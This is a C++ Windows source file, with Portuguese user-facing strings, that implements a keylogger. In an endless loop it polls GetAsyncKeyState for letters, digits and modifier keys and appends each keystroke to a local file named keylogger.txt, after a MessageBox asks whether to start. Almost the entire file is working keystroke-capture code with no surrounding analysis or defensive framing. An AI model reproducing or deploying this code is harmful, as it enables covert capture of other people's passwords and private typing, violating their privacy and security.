#include <windows.h>
#include <fstream>
#include <string>

#define TIME_ 95

void logger() {
	std::ofstream arq;
	arq.open("keylogger.txt", std::ios::out | std::ios::app);

	if (GetAsyncKeyState(VK_CONTROL)) {
		Sleep(TIME_);
		arq << "CONTROL";
		arq.close();
	}
	if (GetAsyncKeyState(0x08)) {
		Sleep(TIME_);
		arq << "BACKSPACE";
		arq.close();
	}
	if (GetAsyncKeyState(0x09)) {
		Sleep(TIME_);
		arq << "TAB" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x0C)) {
		Sleep(TIME_);
		arq << "Chave CLEAR" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x0D)) {
		Sleep(TIME_);
		arq << "ENTER" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x10)) {
		Sleep(TIME_);
		arq << "SHIFT" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x12)) {
		Sleep(TIME_);
		arq << "ALT" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x13)) {
		Sleep(TIME_);
		arq << "PAUSE" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x14)) {
		Sleep(TIME_);
		arq << "CAPS LOCK " << " : ";
		arq.close();
	}
	if (GetAsyncKeyState(0x30)) {
		Sleep(TIME_);
		arq << "0" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x31)) {
		Sleep(TIME_);
		arq << "1" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x32)) {
		Sleep(TIME_);
		arq << "2" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x33)) {
		Sleep(TIME_);
		arq << "3" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x34)) {
		Sleep(TIME_);
		arq << "4" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x35)) {
		Sleep(TIME_);
		arq << "5" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x36)) {
		Sleep(TIME_);
		arq << "6" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x37)) {
		Sleep(TIME_);
		arq << "7" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x38)) {
		Sleep(TIME_);
		arq << "8" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x39)) {
		Sleep(TIME_);
		arq << "9" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x41)) {
		Sleep(TIME_);
		arq << "A" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x42)) {
		Sleep(TIME_);
		arq << "B" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x43)) {
		Sleep(TIME_);
		arq << "C" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x44)) {
		Sleep(TIME_);
		arq << "D" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x45)) {
		Sleep(TIME_);
		arq << "E" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x46)) {
		Sleep(TIME_);
		arq << "F" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x47)) {
		Sleep(TIME_);
		arq << "G" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x48)) {
		Sleep(TIME_);
		arq << "H" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x49)) {
		Sleep(TIME_);
		arq << "I" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x4A)) {
		Sleep(TIME_);
		arq << "J" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x4B)) {
		Sleep(TIME_);
		arq << "K" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x4C)) {
		Sleep(TIME_);
		arq << "L" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x4D)) {
		Sleep(TIME_);
		arq << "M" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x4E)) {
		Sleep(TIME_);
		arq << "N" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x4F)) {
		Sleep(TIME_);
		arq << "O" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x50)) {
		Sleep(TIME_);
		arq << "P" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x51)) {
		Sleep(TIME_);
		arq << "Q" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x52)) {
		Sleep(TIME_);
		arq << "R" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x53)) {
		Sleep(TIME_);
		arq << "S" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x54)) {
		Sleep(TIME_);
		arq << "T" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x55)) {
		Sleep(TIME_);
		arq << "U" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x56)) {
		Sleep(TIME_);
		arq << "V" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x57)) {
		Sleep(TIME_);
		arq << "W" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x58)) {
		Sleep(TIME_);
		arq << "X" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x59)) {
		Sleep(TIME_);
		arq << "Y" << "\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x5A)) {
		Sleep(TIME_);
		arq << "Z" << "\n";
		arq.close();
	}
}

int APIENTRY WinMain(_In_ HINSTANCE hinstance, _In_opt_ HINSTANCE hprevinstance, _In_ LPSTR lpcmdline, _In_ int cmdshow) {
	std::string c;
#ifdef _DEBUG
	c = "Modo debug on!";
#else
	c = "Modo release on!";
#endif

	c = "(" + c + ") Deseja abrir o keylogger?";

	int info = MessageBox(NULL, c.c_str(), "Keylogger", MB_OK | MB_OKCANCEL | MB_ICONQUESTION);

	switch (info)
	{
	case 1:
		while (true) {
			logger();
		}
	case 2:
		MessageBox(NULL, "Programa fechado!.", "Keylogger", MB_OK | MB_ICONQUESTION);
	}
	
	return 0;
}